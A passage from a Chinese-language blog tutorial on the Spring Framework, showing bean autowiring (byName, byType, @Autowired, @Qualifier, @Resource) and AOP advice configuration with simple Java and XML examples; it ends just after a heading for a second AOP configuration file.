<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">TestJavaConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(Javaconfig.class);</span><br><span class="line">        <span class="type">SayHello</span> <span class="variable">hello</span> <span class="operator">=</span> ctx.getBean(SayHello.class);</span><br><span class="line">        System.out.print(hello.sayHello(<span class="string">&quot;mike&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="隐式的bean发现机制和自动装配"><a href="#隐式的bean发现机制和自动装配" class="headerlink" title="隐式的bean发现机制和自动装配"></a>隐式的bean发现机制和自动装配</h1><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>创建实体类</p>
<p>Cat类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shout</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;miaomiaomiao&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Dog类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shout</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;wangwangwang&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Person类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String username, Cat cat, Dog dog)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.cat = cat;</span><br><span class="line">        <span class="built_in">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, cat=&quot;</span> + cat +</span><br><span class="line">                <span class="string">&quot;, dog=&quot;</span> + dog +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Cat <span class="title function_">getCat</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCat</span><span class="params">(Cat cat)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Dog <span class="title function_">getDog</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDog</span><span class="params">(Dog dog)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Spring配置文件上注入Bean</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Cat&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Dog&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Person&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;mike&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;cat&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dog&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">TestPerson</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">cx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">    <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) cx.getBean(<span class="string">&quot;person&quot;</span>);</span><br><span class="line">    person.getCat().shout();</span><br><span class="line">    person.getDog().shout();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ByName自动装配"><a href="#ByName自动装配" class="headerlink" title="ByName自动装配"></a>ByName自动装配</h3><p>修改Spring配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Cat&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Dog&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;mike&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;property name=&quot;cat&quot; ref=&quot;cat&quot; /&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;property name=&quot;dog&quot; ref=&quot;dog&quot; /&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>byName的执行过程：</strong></p>
<ul>
<li>byName依赖于实体类的set方法</li>
<li>查找其类中所有的set方法名，例如setCat，获得将set去掉并且首字母小写的字符串，即cat。</li>
<li>去spring容器中寻找是否有此字符串名称id的对象。</li>
<li>如果有，就取出注入；如果没有，就报空指针异常（java.lang.NullPointerException）。</li>
</ul>
<h2 id="ByType自动装配"><a href="#ByType自动装配" class="headerlink" title="ByType自动装配"></a>ByType自动装配</h2><p>修改Spring Bean注入配置文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Cat&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Dog&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;mike&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;property name=&quot;cat&quot; ref=&quot;cat&quot; /&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;property name=&quot;dog&quot; ref=&quot;dog&quot; /&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用autowire byType首先需要保证：<strong>同一类型的对象</strong>，<strong>在spring容器中唯一</strong>。如果不唯一，会报不唯一的异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">NoUniqueBeanDefinitionException</span><br></pre></td></tr></table></figure>

<p><strong>byType注意：</strong></p>
<ul>
<li>ByType按照类型自动装配</li>
<li>每个bean的类型必须唯一，不可重复</li>
<li>它不依赖set方法，而是按照对应的类型进行装配</li>
</ul>
<p><strong>总结：</strong></p>
<ul>
<li><strong>使用byName的时候，需要保证所有bean的id唯一，并且这个bean需要和自动注入的属性的set方法的值一致!</strong></li>
<li><strong>使用byType的时候，需要保证所有bean的Class唯一，并且这个bean需要和自动注入的属性的类型一致!</strong></li>
</ul>
<h2 id="使用注解实现自动装配"><a href="#使用注解实现自动装配" class="headerlink" title="使用注解实现自动装配"></a>使用注解实现自动装配</h2><p>jdk1.5开始支持注解，spring2.5开始全面支持注解</p>
<p>准备：</p>
<ol>
<li><p>导入约束：context约束</p>
</li>
<li><p>配置注解的支持</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>Spring 配置文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Autowired"><a href="#Autowired" class="headerlink" title="@Autowired"></a>@Autowired</h3><p>在实体类的属性上添加@Autowired注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> Cat cat;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> Dog dog;</span><br></pre></td></tr></table></figure>

<p>修改Spring配置文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Cat&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Dog&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;newperson&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.NewPerson&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>注：</strong>@Autowired 注释，它可以对类成员变量、方法及构造函数进行标注，完成自动装配的工作</p>
<ul>
<li><p>@Autowired是<strong>按类型自动转配的</strong>，不支持id匹配。</p>
</li>
<li><p>直接在属性上添加@Autowired注解即可，也可以添加在setter方法上。</p>
</li>
<li><p>使用了@Autowired的属性，不需要setter方法也可以实现注入</p>
</li>
<li><p>@Autowired(required&#x3D;false) 说明：false，对象可以为null；true，对象必须存对象，不能为null。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果允许对象为null，设置required = false,默认为true</span></span><br><span class="line"><span class="meta">@Autowired(required = false)</span></span><br><span class="line"><span class="keyword">private</span> Cat cat;</span><br></pre></td></tr></table></figure>
</li>
<li><p>@Nullable，可以用于方法，属性，表示可以为null</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// @Nullable，表示当前属性可以为null</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">People</span><span class="params">(<span class="meta">@Nullable</span> String name)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Qualifier"><a href="#Qualifier" class="headerlink" title="@Qualifier"></a>@Qualifier</h3><p>修改Bean，一个类有多个对象</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Cat&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Cat&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Dog&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Dog&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>在实体类中需要加上@Qualifier</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="meta">@Qualifier(&quot;cat1&quot;)</span></span><br><span class="line"><span class="keyword">private</span> Cat cat;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="meta">@Qualifier(&quot;dog1&quot;)</span></span><br><span class="line"><span class="keyword">private</span> Dog dog;</span><br></pre></td></tr></table></figure>

<h3 id="Resource"><a href="#Resource" class="headerlink" title="@Resource"></a>@Resource</h3><p>修改实体类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Resource(name=&quot;cat1&quot;)</span></span><br><span class="line"><span class="keyword">private</span> Cat cat;</span><br><span class="line"><span class="meta">@Resource</span></span><br><span class="line"><span class="keyword">private</span>  Dog dog;</span><br></pre></td></tr></table></figure>

<p>修改配置文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Cat&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Cat&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Dog&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Dog&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>注：@Resource不是spring的注解，属于 <strong>javax.annotation.Resource</strong> ；它也可以实现自动装配</p>
<ul>
<li>@Resource可以指定的name属性，设置name后使用指定的name进行byName方式查找装配；</li>
<li>上面的方法没找到再使用默认的byName方式查找（方法名小写）</li>
<li>通过byName方法没有找到时，再使用byType的方式装配</li>
<li>如果byName和byType方法全部没有找到，则会报错！</li>
</ul>
<h1 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h1><p>AOP（Aspect Oriented Programming）意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。AOP是OOP的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容，是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。</p>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p> 添加依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>编写业务接口和实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">service1</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">query</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> <span class="keyword">implements</span> <span class="title class_">service1</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;添加方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">query</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;查询方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;删除方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;更新方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>增强类：前置增强和后置增强</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// log.class</span></span><br><span class="line"><span class="keyword">package</span> org.example.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.MethodBeforeAdvice;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log</span> <span class="keyword">implements</span> <span class="title class_">MethodBeforeAdvice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">(Method method, Object[] objects, Object o)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(o.getClass().getName()+<span class="string">&quot;De&quot;</span>+method.getName()+<span class="string">&quot;方法执行了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// After.class</span></span><br><span class="line"><span class="keyword">package</span> org.example.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.AfterReturningAdvice;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Afterlog</span> <span class="keyword">implements</span> <span class="title class_">AfterReturningAdvice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturning</span><span class="params">(Object o, Method method, Object[] objects, Object o1)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了&quot;</span>+method.getName()+<span class="string">&quot;执行结果为&quot;</span>+o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在spring配置文件aopContext.xml中注册，实现AOP切入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop https://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    注册bean--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userservice&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.UserService&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;log&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.log&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;afterlog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.Afterlog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    AOP配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        切入点expression：表达式匹配要执行的方法--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;pointcut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* org.example.learn.UserService.*(..))&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        环绕执行；advice-ref执行方法，pointcut-ref切入点--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;log&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;afterlog&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">TestService</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">cx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;aopContext.xml&quot;</span>);</span><br><span class="line">    <span class="type">service1</span> <span class="variable">service</span> <span class="operator">=</span> (service1) cx.getBean(<span class="string">&quot;userservice&quot;</span>);</span><br><span class="line">    service.delete();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>业务接口和实现类同上</p>
<p>使用自定义的切入类DiyPointCut.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DiyPointCut</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;------方法执行前------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;------方法执行后------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Spring配置文件aopContext2.xml</p>
